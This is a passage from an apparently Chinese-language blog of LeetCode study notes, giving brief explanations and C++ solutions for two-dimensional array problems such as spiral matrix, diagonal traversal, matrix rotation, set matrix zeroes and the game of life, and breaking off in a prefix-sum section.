class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxCount</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; ops)</span> </span>&#123;<br>        <span class="hljs-type">int</span> mina = m, minb = n;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; op: ops) &#123;<br>            mina = <span class="hljs-built_in">min</span>(mina, op[<span class="hljs-number">0</span>]);<br>            minb = <span class="hljs-built_in">min</span>(minb, op[<span class="hljs-number">1</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> mina * minb;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="甲板上的战舰">甲板上的战舰</h2><blockquote><p>它遍历了一个二维字符数组（表示游戏板），检查每个位置上是否有战舰（用'X'表示）。对于每个被标记为战舰的位置，检查其上方和左方是否为空位（用'.'表示），如果是，则将战舰数量加1。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countBattleships</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = board.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = board[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; board[i - <span class="hljs-number">1</span>][j] == <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; board[i][j - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                    count++;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="特定顺序遍历二维数组">6. 特定顺序遍历二维数组</h1><h2 id="螺旋矩阵">螺旋矩阵</h2><blockquote><p>使用四个变量<code>left</code>、<code>right</code>、<code>top</code>、<code>bottom</code>来定义当前螺旋遍历的边界。使用循环不断迭代，直到遍历完整个矩阵。在每一轮迭代中，按照顺时针方向依次遍历上、右、下、左四个边界，将元素依次存储在结果数组中，并更新边界。最后返回存储了螺旋遍历结果的数组的指针。注意：<code>res.size() &lt; m * n</code>用来保证每次遍历不超出数组范围。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">spiralOrder</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> top = <span class="hljs-number">0</span>, bottom = m - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (res.<span class="hljs-built_in">size</span>() &lt; m * n) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = left; i &lt;= right &amp;&amp; res.<span class="hljs-built_in">size</span>() &lt; m * n; i++) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(matrix[top][i]);<br>            &#125;<br>            top++;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = top; i &lt;= bottom &amp;&amp; res.<span class="hljs-built_in">size</span>() &lt; m * n; i++) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(matrix[i][right]);<br>            &#125;<br>            right--;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = right; i &gt;= left &amp;&amp; res.<span class="hljs-built_in">size</span>() &lt; m * n; i--) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(matrix[bottom][i]);<br>            &#125;<br>            bottom--;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = bottom; i &gt;= top &amp;&amp; res.<span class="hljs-built_in">size</span>() &lt; m * n; i--) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(matrix[i][left]);<br>            &#125;<br>            left++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="螺旋矩阵ii">螺旋矩阵II</h2><blockquote><p>思路同上题。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generateMatrix</span>(<span class="hljs-type">int</span> n) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">res</span>(n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n));<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> top = <span class="hljs-number">0</span>, bottom = n - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> num = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (num &lt;= n * n) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = left; i &lt;= right &amp;&amp; num &lt;= n * n; i++) &#123;<br>                res[top][i] = num;<br>                num++;<br>            &#125;<br>            top++;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = top; i &lt;= bottom &amp;&amp; num &lt;= n * n; i++) &#123;<br>                res[i][right] = num;<br>                num++;<br>            &#125;<br>            right--;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = right; i &gt;= left &amp;&amp; num &lt;= n * n; i--) &#123;<br>                res[bottom][i] = num;<br>                num++;<br>            &#125;<br>            bottom--;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = bottom; i &gt;= top &amp;&amp; num &lt;= n * n; i--) &#123;<br>                res[i][left] = num;<br>                num++;<br>            &#125;<br>            left++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="对角线遍历">对角线遍历</h2><blockquote><p>首先从矩阵的左上角开始，沿着对角线向右上方向遍历，直到达到矩阵边界，然后切换到向左下方向遍历。重复这一过程，确保每次遍历都在有效索引范围内，最终将所有元素按对角线顺序添加到结果数组中并返回。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findDiagonalOrder</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = mat.<span class="hljs-built_in">size</span>(); <br>        <span class="hljs-type">int</span> n = mat[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>(); <br>        vector&lt;<span class="hljs-type">int</span>&gt; res; <br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; <br>        <span class="hljs-keyword">while</span> (res.<span class="hljs-built_in">size</span>() &lt; m * n) &#123; <br>            <span class="hljs-comment">// 向上遍历</span><br>            <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; n) &#123; <br>                res.<span class="hljs-built_in">push_back</span>(mat[i][j]);<br>                i--;<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (j &lt; n) &#123; <br>                i++; <br>            &#125; <span class="hljs-keyword">else</span> &#123; <br>                i += <span class="hljs-number">2</span>; <br>                j--; <br>            &#125;<br>            <span class="hljs-comment">// 向下遍历</span><br>            <span class="hljs-keyword">while</span> (i &lt; m &amp;&amp; j &gt;= <span class="hljs-number">0</span>) &#123; <br>                res.<span class="hljs-built_in">push_back</span>(mat[i][j]);<br>                i++;<br>                j--;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i &lt; m) &#123; <br>                j++; <br>            &#125; <span class="hljs-keyword">else</span> &#123; <br>                j += <span class="hljs-number">2</span>; <br>                i--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res; <br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二维数组变换">7. 二维数组变换</h1><h2 id="重塑矩阵">重塑矩阵</h2><blockquote><p>如果原矩阵的元素数量与目标行列数不匹配，则返回原矩阵；否则，将原矩阵按顺序重新填充到新矩阵中，并返回新矩阵。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">matrixReshape</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; nums, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c) &#123;<br>        <span class="hljs-type">int</span> m = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = nums[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (m * n != r * c) &#123;<br>            <span class="hljs-keyword">return</span> nums;<br>        &#125;<br><br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">ans</span>(r, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(c));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; m * n; ++x) &#123;<br>            ans[x / c][x % c] = nums[x / n][x % n];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="旋转图像">旋转图像</h2><blockquote><p>首先进行转置操作，然后对每一行进行水平翻转，实现了原地旋转90度的功能。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rotate</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-built_in">swap</span>(matrix[i][j], matrix[j][i]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n / <span class="hljs-number">2</span>; j++) &#123;<br>                <span class="hljs-built_in">swap</span>(matrix[i][j], matrix[i][n - <span class="hljs-number">1</span> - j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="矩阵置零">矩阵置零</h2><blockquote><p>法一：用两个标记数组分别记录每一行和每一列是否有零出现。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setZeroes</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">row</span><span class="hljs-params">(m)</span></span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">col</span><span class="hljs-params">(n)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            row[i] = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            col[j] = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (matrix[i][j] == <span class="hljs-number">0</span>) &#123;<br>                    row[i] = <span class="hljs-number">0</span>;<br>                    col[j] = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (row[i] == <span class="hljs-number">0</span> || col[j] == <span class="hljs-number">0</span>) &#123;<br>                    matrix[i][j] = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：用矩阵的第一行和第一列代替方法一中的两个标记数组，以达到 O(1)的额外空间。但这样会导致原数组的第一行和第一列被修改，无法记录它们是否原本包含0。因此我们需要额外使用两个标记变量分别记录第一行和第一列是否原本包含0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setZeroes</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> flag_col0 = <span class="hljs-literal">false</span>, flag_row0 = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">if</span> (!matrix[i][<span class="hljs-number">0</span>]) &#123;<br>                flag_col0 = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">if</span> (!matrix[<span class="hljs-number">0</span>][j]) &#123;<br>                flag_row0 = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (!matrix[i][j]) &#123;<br>                    matrix[i][<span class="hljs-number">0</span>] = matrix[<span class="hljs-number">0</span>][j] = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (!matrix[i][<span class="hljs-number">0</span>] || !matrix[<span class="hljs-number">0</span>][j]) &#123;<br>                    matrix[i][j] = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (flag_col0) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>                matrix[i][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (flag_row0) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                matrix[<span class="hljs-number">0</span>][j] = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="生命游戏">生命游戏</h2><blockquote><p>通过引入两个额外的状态(-1 和2)来标记那些将要改变状态的细胞，从而在所有细胞状态更新前避免直接改变任何细胞的状态。在第一遍遍历时，它计算每个细胞周围活细胞的数量，并根据游戏规则决定细胞的命运。然后，在第二次遍历中，它将所有标记为-1的细胞变为死亡状态（0），将所有标记为2的细胞变为活状态（1），从而完成状态的更新。这种方法确保了在更新任何细胞状态之前，所有细胞的命运都已经决定，从而遵循了游戏的规则。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">gameOfLife</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; board)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = board.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = board[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-comment">// -1 表示活变死，2 表示死变活</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, i - <span class="hljs-number">1</span>); x &lt;= <span class="hljs-built_in">min</span>(m - <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>); x++) &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, j - <span class="hljs-number">1</span>); y &lt;= <span class="hljs-built_in">min</span>(n - <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>); y++) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">abs</span>(board[x][y])==<span class="hljs-number">1</span>) &#123;<br>                            count++;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-number">1</span>) &#123;<br>                    count--;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-number">1</span> &amp;&amp; (count &lt; <span class="hljs-number">2</span> || count &gt; <span class="hljs-number">3</span>)) &#123;<br>                    board[i][j] = <span class="hljs-number">-1</span>; <span class="hljs-comment">// 活细胞变为死细胞</span><br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-number">0</span> &amp;&amp; count == <span class="hljs-number">3</span>) &#123;<br>                    board[i][j] = <span class="hljs-number">2</span>; <span class="hljs-comment">// 死细胞变为活细胞</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-number">-1</span>) &#123;<br>                    board[i][j] = <span class="hljs-number">0</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-number">2</span>) &#123;<br>                    board[i][j] = <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="前缀和数组">8. 前缀和数组</h1><h2 id="区域和检索---数组不可变">区域和检索 - 数组不可变</h2><blockquote><p>前缀和数组大小设置为 n + 1的主要目的是为了方便处理前缀和的边界情况。通常情况下，前缀和数组的大小会比原始数组的大小多1，这是因为前缀和数组的第一个元素通常是0，用于处理从原始数组的起始位置到第一个元素的前缀和为 0 的情况。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumArray</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; sums;<br><br>    <span class="hljs-built_in">NumArray</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        sums.<span class="hljs-built_in">resize</span>(n + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i 